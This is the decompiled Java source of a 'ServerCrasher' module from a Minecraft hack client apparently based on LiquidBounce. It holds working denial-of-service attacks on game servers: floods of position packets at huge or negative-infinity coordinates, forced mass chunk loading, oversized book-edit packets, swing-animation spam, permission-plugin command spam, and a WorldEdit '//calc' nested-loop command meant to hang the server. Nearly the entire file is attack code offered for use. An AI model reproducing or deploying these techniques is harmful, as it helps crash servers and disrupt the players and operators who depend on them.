/*     */ package net.ccbluex.liquidbounce.features.module.modules.exploit;
/*     */ import kotlin.jvm.internal.DoubleCompanionObject;
/*     */ import kotlin.jvm.internal.Intrinsics;
/*     */ import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntityPlayerSP;
/*     */ import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagCompound;
/*     */ import net.ccbluex.liquidbounce.api.minecraft.network.IPacket;
/*     */ import net.ccbluex.liquidbounce.api.network.IPacketBuffer;
/*     */ import net.ccbluex.liquidbounce.event.MotionEvent;
/*     */ import net.ccbluex.liquidbounce.event.WorldEvent;
/*     */ import net.ccbluex.liquidbounce.utils.MinecraftInstance;
/*     */ import org.jetbrains.annotations.NotNull;
/*     */ 
/*     */ @ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
/*     */ @Metadata(mv = {1, 1, 16}, bv = {1, 0, 3}, k = 1, d1 = {"\000:\n\002\030\002\n\002\030\002\n\002\b\002\n\002\030\002\n\000\n\002\030\002\n\000\n\002\020\016\n\002\b\003\n\002\020\002\n\002\b\002\n\002\030\002\n\000\n\002\030\002\n\000\n\002\030\002\n\000\b\007\030\0002\0020\001B\005¢\006\002\020\002J\b\020\013\032\0020\fH\026J\020\020\r\032\0020\f2\006\020\016\032\0020\017H\007J\022\020\020\032\0020\f2\b\020\016\032\004\030\0010\021H\007J\020\020\022\032\0020\f2\006\020\016\032\0020\023H\007R\016\020\003\032\0020\004X\004¢\006\002\n\000R\016\020\005\032\0020\006X\004¢\006\002\n\000R\024\020\007\032\0020\b8VX\004¢\006\006\032\004\b\t\020\n¨\006\024"}, d2 = {"Lnet/ccbluex/liquidbounce/features/module/modules/exploit/ServerCrasher;", "Lnet/ccbluex/liquidbounce/features/module/Module;", "()V", "modeValue", "Lnet/ccbluex/liquidbounce/value/ListValue;", "pexTimer", "Lnet/ccbluex/liquidbounce/utils/timer/MSTimer;", "tag", "", "getTag", "()Ljava/lang/String;", "onEnable", "", "onMotion", "event", "Lnet/ccbluex/liquidbounce/event/MotionEvent;", "onTick", "Lnet/ccbluex/liquidbounce/event/TickEvent;", "onWorld", "Lnet/ccbluex/liquidbounce/event/WorldEvent;", "XSJClient"})
/*     */ public final class ServerCrasher extends Module {
/*  16 */   private final ListValue modeValue = new ListValue("Mode", new String[] {
/*  17 */         "Book", 
/*  18 */         "Swing", 
/*  19 */         "MassiveChunkLoading", 
/*  20 */         "WorldEdit", 
/*  21 */         "Pex", 
/*  22 */         "CubeCraft", 
/*  23 */         "AACNew", "AACOther", "AACOld" }, "Book");
/*     */   
/*  25 */   private final MSTimer pexTimer = new MSTimer();
/*     */   
/*     */   public void onEnable() {
/*  28 */     if (MinecraftInstance.mc.getThePlayer() != null) { IEntityPlayerSP thePlayer = MinecraftInstance.mc.getThePlayer();
/*     */       
/*  30 */       String str = (String)this.modeValue.get(); byte b = 0; if (str == null) throw new TypeCastException("null cannot be cast to non-null type java.lang.String");  Intrinsics.checkExpressionValueIsNotNull(str.toLowerCase(), "(this as java.lang.String).toLowerCase()"); str = str.toLowerCase(); switch (str.hashCode()) { case -1425299843:
/*  31 */           if (str.equals("aacnew")) {
/*     */             
/*  33 */             int index = 0;
/*  34 */             while (index < 9999) {
/*  35 */               MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(
/*  36 */                     thePlayer.getPosX() + (9412 * index), 
/*  37 */                     thePlayer.getEntityBoundingBox().getMinY() + (9412 * index), 
/*  38 */                     thePlayer.getPosZ() + (9412 * index), 
/*  39 */                     true));
/*     */               
/*  41 */               index++;
/*     */             } 
/*     */           } 
/*     */           break;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */         
/*     */         case -11181677:
/*  69 */           if (str.equals("massivechunkloading"))
/*     */           
/*  71 */           { double yPos = thePlayer.getPosY();
/*  72 */             while (yPos < 'ÿ') {
/*  73 */               MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX(), 
/*  74 */                     yPos, thePlayer.getPosZ(), true));
/*  75 */               double d = yPos + 5.0D;
/*     */             } 
/*     */ 
/*     */             
/*  79 */             int i = 0;
/*  80 */             while (i < 6685)
/*  81 */             { MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(
/*  82 */                     thePlayer.getPosX() + i, 255.0D, thePlayer.getPosZ() + i, true));
/*     */               
/*  84 */               i += 5; }  }  break;
/*     */         case 1123315868: if (str.equals("worldedit"))
/*     */             thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");  break;
/*     */         case 382777517: if (str.equals("aacother")) { b = 0; while (b < '✏') { MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (500000 * b), thePlayer.getEntityBoundingBox().getMinY() + (500000 * b), thePlayer.getPosZ() + (500000 * b), true)); b++; }  }  break;
/*     */         case -1425298684: if (str.equals("aacold"))
/*     */             MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), true));  break;
/*     */         case -1031473397:
/*     */           if (str.equals("cubecraft"))
/*  92 */             thePlayer.setPosition(thePlayer.getPosX(), thePlayer.getPosY() + 0.3D, thePlayer.getPosZ());  break; }  return; }  MinecraftInstance.mc.getThePlayer(); } @EventTarget public final void onMotion(@NotNull MotionEvent event) { Intrinsics.checkParameterIsNotNull(event, "event"); IEntityPlayerSP thePlayer = MinecraftInstance.mc.getThePlayer();
/*     */     
/*  94 */     if (event.getEventState() == EventState.POST || thePlayer == null) {
/*     */       return;
/*     */     }
/*  97 */     String str = (String)this.modeValue.get(); boolean bool = false; if (str == null) throw new TypeCastException("null cannot be cast to non-null type java.lang.String");  Intrinsics.checkExpressionValueIsNotNull(str.toLowerCase(), "(this as java.lang.String).toLowerCase()"); str = str.toLowerCase(); switch (str.hashCode())
/*     */     
/*     */     { 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*     */       case 110883:
/* 135 */         if (str.equals("pex")) { if (this.pexTimer.hasTimePassed(2000L))
/*     */           
/* 137 */           { thePlayer.sendChatMessage((new Random()).nextBoolean() ? "/pex promote a a" : "/pex demote a a");
/* 138 */             this.pexTimer.reset(); }  return; }  break;
/*     */       case 109854462:
/* 140 */         if (str.equals("swing"))
/* 141 */         { int i = 0;
/* 142 */           while (i < 5000)
/* 143 */           { MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketAnimation());
/* 144 */             i++; }  return; }  break;
/*     */       case 3029737: if (str.equals("book")) { IItemStack bookStack = MinecraftInstance.classProvider.createItemStack(MinecraftInstance.classProvider.getItemEnum(ItemType.WRITABLE_BOOK)); INBTTagCompound bookCompound = MinecraftInstance.classProvider.createNBTTagCompound(); bookCompound.setString("author", RandomUtils.INSTANCE.randomNumber(20)); bookCompound.setString("title", RandomUtils.INSTANCE.randomNumber(20)); INBTTagList pageList = MinecraftInstance.classProvider.createNBTTagList(); String pageText = RandomUtils.INSTANCE.randomNumber(600); byte b2; for (byte b1 = 0; b1 <= b2; b1++)
/*     */             pageList.appendTag((INBTBase)MinecraftInstance.classProvider.createNBTTagString(pageText));  bookCompound.setTag("pages", (INBTBase)pageList); bookStack.setTagCompound(bookCompound); for (int i = 0; i <= b2; i++) { Intrinsics.checkExpressionValueIsNotNull(Unpooled.buffer(), "Unpooled.buffer()"); IPacketBuffer packetBuffer = MinecraftInstance.classProvider.createPacketBuffer(Unpooled.buffer()); packetBuffer.writeItemStackToBuffer(bookStack); MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer)); }  return; }  break;
/* 147 */       case -1031473397: if (str.equals("cubecraft")) { double x = thePlayer.getPosX(); double y = thePlayer.getPosY(); double z = thePlayer.getPosZ(); int i = 0; while (i < 3000) { MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y + 0.09999999999999D, z, false)); MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket)MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y, z, true)); i++; }  thePlayer.setMotionY(0.0D); return; }  break; }  setState(false); }
/*     */ 
/*     */ 
/*     */   
/*     */   @EventTarget
/*     */   public final void onWorld(@NotNull WorldEvent event) {
/* 153 */     Intrinsics.checkParameterIsNotNull(event, "event"); if (event.getWorldClient() == null)
/* 154 */       setState(false); 
/*     */   }
/*     */   
/*     */   @EventTarget
/*     */   public final void onTick(@Nullable TickEvent event) {
/* 159 */     if (MinecraftInstance.mc.getThePlayer() == null || MinecraftInstance.mc.getTheWorld() == null)
/* 160 */       setState(false); 
/*     */   }
/*     */   @NotNull
/*     */   public String getTag() {
/* 164 */     return (String)this.modeValue.get();
/*     */   }
/*     */ }


/* Location:              C:\Users\Administrator\Desktop\XSJ Client v2.3 New Year's Special Edition.jar!\net\ccbluex\liquidbounce\features\module\modules\exploit\ServerCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */